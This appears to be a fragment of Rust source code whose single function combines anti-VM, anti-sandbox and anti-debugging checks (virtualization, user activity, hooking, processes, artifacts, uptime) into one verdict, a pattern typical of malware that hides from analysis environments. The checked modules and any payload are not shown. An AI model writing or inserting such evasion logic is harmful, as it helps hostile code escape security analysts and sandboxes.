pub fn run_all_checks() -> bool {
    anti_vm::is_virtualized()
        || anti_sandbox::check_user_activity()
        || anti_sandbox::check_for_hooking()
        || anti_sandbox::check_processes()
        || anti_sandbox::check_artifacts()
        || anti_sandbox::check_uptime()
        || anti_debug_rust::run_all_checks_hidden()
}
